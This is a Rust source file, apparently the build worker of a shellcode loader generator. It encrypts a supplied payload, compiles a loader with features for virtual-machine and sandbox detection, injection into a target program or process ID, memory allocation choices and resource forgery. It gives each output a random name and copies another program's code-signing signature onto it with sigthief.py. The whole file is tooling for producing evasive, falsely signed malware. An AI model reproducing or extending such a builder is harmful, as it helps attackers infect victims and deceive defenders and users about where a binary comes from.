use anyhow::{anyhow, Result};
use std::path::Path;
use std::process::Command;
use std::sync::mpsc::{channel, Receiver, Sender};
use std::thread;
use std::fs;
use crate::config::{ConfigManager, PluginsManifest};

#[derive(Debug, Clone)]
pub struct BuildParams {
    pub input_bin: String,
    pub run_mode: String,
    pub vm_checks: String,
    pub enc_method: String,
    pub encode_method: String,
    pub icon_path: String,
    pub sign_enable: bool,
    pub sign_app: Option<String>,
    pub forgery_enable: bool,
    pub mem_mode: String,
    pub target: String,
    pub target_program: String,
    pub target_pid: String,
    pub win7_compat: bool,
}

#[derive(Debug, Clone)]
pub enum WorkerMessage {
    Log(String),
    Progress(u32),
    Done(String),
    Error(String),
}

pub struct BuildWorker {
    manifest: PluginsManifest,
}

impl BuildWorker {
    pub fn new(manifest: PluginsManifest) -> Self {
        BuildWorker { manifest }
    }
    
    pub fn start_build(self, params: BuildParams) -> Receiver<WorkerMessage> {
        let (tx, rx) = channel();
        
        thread::spawn(move || {
            if let Err(e) = self.run_build(&params, &tx) {
                let _ = tx.send(WorkerMessage::Error(format!("{}", e)));
            }
        });
        
        rx
    }
    
    fn run_build(&self, params: &BuildParams, tx: &Sender<WorkerMessage>) -> Result<()> {
        let _ = tx.send(WorkerMessage::Progress(0));
        let _ = tx.send(WorkerMessage::Log("Starting build process...".to_string()));
        
        self.encrypt_payload(params, tx)?;
        self.build_rust_project(params, tx)?;
        let output_file = self.copy_output(params, tx)?;
        
        if params.sign_enable {
            self.sign_executable(&output_file, params, tx)?;
        }
        
        let _ = tx.send(WorkerMessage::Progress(100));
        let _ = tx.send(WorkerMessage::Log("Build completed successfully!".to_string()));
        let _ = tx.send(WorkerMessage::Done(output_file));
        
        Ok(())
    }
    
    fn encrypt_payload(&self, params: &BuildParams, tx: &Sender<WorkerMessage>) -> Result<()> {
        let _ = tx.send(WorkerMessage::Log("Encrypting payload...".to_string()));
        let _ = tx.send(WorkerMessage::Progress(10));
        
        let enc_map = ConfigManager::get_encryption_map(&self.manifest);
        let enc_method_arg = enc_map
            .get(&params.enc_method)
            .cloned()
            .unwrap_or_else(|| params.enc_method.clone());
        
        let output = Command::new("python3")
            .arg("encrypt.py")
            .arg("-i")
            .arg(&params.input_bin)
            .arg("-o")
            .arg("src/encrypt.bin")
            .arg("-m")
            .arg(&enc_method_arg)
            .arg("-e")
            .arg(&params.encode_method)
            .output()?;
        
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let _ = tx.send(WorkerMessage::Log(format!("Encryption error: {}", stderr)));
            return Err(anyhow!("Encryption failed"));
        }
        
        let stdout = String::from_utf8_lossy(&output.stdout);
        if !stdout.is_empty() {
            let _ = tx.send(WorkerMessage::Log(stdout.to_string()));
        }
        
        let _ = tx.send(WorkerMessage::Progress(40));
        Ok(())
    }
    
    fn build_rust_project(&self, params: &BuildParams, tx: &Sender<WorkerMessage>) -> Result<()> {
        let _ = tx.send(WorkerMessage::Log("Building Rust project...".to_string()));
        
        let features = self.build_features_list(params)?;
        let features_str = features.join(",");
        
        let _ = tx.send(WorkerMessage::Log(format!("Enabled features: {}", features_str)));
        let _ = tx.send(WorkerMessage::Log(format!("Build target: {}", params.target)));
        
        // Determine pattern for target program/pid
        let pattern = self.manifest
            .run_modes
            .iter()
            .find(|r| r.id == params.run_mode)
            .map(|r| r.pattern)
            .unwrap_or(1);
        
        let mut cmd = Command::new("cargo");
        cmd.arg("build")
            .arg("--release")
            .arg("--no-default-features")
            .arg("--target")
            .arg(&params.target)
            .arg(format!("--features={}", features_str));
        
        if pattern == 2 && !params.target_program.is_empty() {
            cmd.env("RSL_TARGET_PROGRAM", &params.target_program);
        } else if pattern == 3 && !params.target_pid.is_empty() {
            cmd.env("RSL_TARGET_PID", &params.target_pid);
        }
        
        cmd.env("RSL_ICON_PATH", &params.icon_path);
        
        let output = cmd.output()?;
        
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let _ = tx.send(WorkerMessage::Log(format!("Build error: {}", stderr)));
            return Err(anyhow!("Build failed"));
        }
        
        let stdout = String::from_utf8_lossy(&output.stdout);
        if !stdout.is_empty() {
            let _ = tx.send(WorkerMessage::Log(stdout.to_string()));
        }
        
        let _ = tx.send(WorkerMessage::Progress(50));
        Ok(())
    }
    
    fn build_features_list(&self, params: &BuildParams) -> Result<Vec<String>> {
        let mut features = Vec::new();
        
        // VM checks
        let vm_map = ConfigManager::get_vm_checks_map(&self.manifest);
        let selected: Vec<&str> = params.vm_checks.split(',').filter(|s| !s.is_empty()).collect();
        for vm_id in selected {
            if let Some(feature) = vm_map.get(vm_id) {
                features.push(feature.clone());
            }
        }
        
        // Encryption
        let enc_feature_map = ConfigManager::get_encryption_feature_map(&self.manifest);
        let default_enc = ConfigManager::get_default_value(&self.manifest, "encryption")
            .unwrap_or_else(|| "decrypt_ipv4".to_string());
        let enc_feature = enc_feature_map
            .get(&params.enc_method)
            .cloned()
            .unwrap_or_else(|| default_enc.clone());
        features.push(enc_feature);
        
        // Encoding
        match params.encode_method.as_str() {
            "base64" => features.push("base64_decode".to_string()),
            "base32" => features.push("base32_decode".to_string()),
            _ => features.push("none_decode".to_string()),
        }
        
        // Run mode
        let run_map = ConfigManager::get_run_mode_map(&self.manifest);
        let default_run = ConfigManager::get_default_value(&self.manifest, "run_mode")
            .unwrap_or_else(|| "run_create_thread".to_string());
        let run_feature = run_map
            .get(&params.run_mode)
            .cloned()
            .unwrap_or_else(|| default_run.clone());
        features.push(run_feature);
        
        // Memory allocation
        let mem_map = ConfigManager::get_alloc_mem_feature_map(&self.manifest);
        let default_mem = ConfigManager::get_default_value(&self.manifest, "alloc_mem_mode")
            .unwrap_or_else(|| "alloc_mem_va".to_string());
        let mem_feature = mem_map
            .get(&params.mem_mode)
            .cloned()
            .unwrap_or_else(|| default_mem);
        features.push(mem_feature);
        
        // Resource forgery
        if params.forgery_enable {
            features.push("with_forgery".to_string());
        }
        
        // Win7 compatibility
        if params.win7_compat {
            features.push("win7".to_string());
        }
        
        Ok(features)
    }
    
    fn copy_output(&self, params: &BuildParams, tx: &Sender<WorkerMessage>) -> Result<String> {
        let _ = tx.send(WorkerMessage::Log("Copying output...".to_string()));
        
        let src_file = Path::new("target")
            .join(&params.target)
            .join("release")
            .join("rsl.exe");
        
        let out_dir = Path::new("output");
        if !out_dir.exists() {
            fs::create_dir_all(out_dir)?;
        }
        
        // Generate random filename using current timestamp
        let random_name = {
            use std::time::{SystemTime, UNIX_EPOCH};
            let now = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos();
            format!("{:x}.exe", now)
        };
        
        let dst_file = out_dir.join(&random_name);
        
        if !src_file.exists() {
            return Err(anyhow!("Build output not found: {:?}", src_file));
        }
        
        fs::copy(&src_file, &dst_file)?;
        let _ = tx.send(WorkerMessage::Log(format!("Copied and renamed: {}", dst_file.display())));
        
        Ok(dst_file.to_string_lossy().to_string())
    }
    
    fn sign_executable(&self, dst_file: &str, params: &BuildParams, tx: &Sender<WorkerMessage>) -> Result<()> {
        let app_path = params.sign_app.as_ref()
            .ok_or_else(|| anyhow!("No application selected for signing"))?;
        
        let sign_out_file = format!("{}_signed.exe", dst_file.trim_end_matches(".exe"));
        
        let output = Command::new("python3")
            .arg("sign/sigthief.py")
            .arg("-i")
            .arg(app_path)
            .arg("-t")
            .arg(dst_file)
            .arg("-o")
            .arg(&sign_out_file)
            .output()?;
        
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let _ = tx.send(WorkerMessage::Log(format!("Signing error: {}", stderr)));
            return Err(anyhow!("Signing failed"));
        }
        
        let stdout = String::from_utf8_lossy(&output.stdout);
        if !stdout.is_empty() {
            let _ = tx.send(WorkerMessage::Log(stdout.to_string()));
        }
        
        fs::rename(&sign_out_file, dst_file)?;
        let _ = tx.send(WorkerMessage::Log(format!("Signing completed: {}", dst_file)));
        
        Ok(())
    }
}
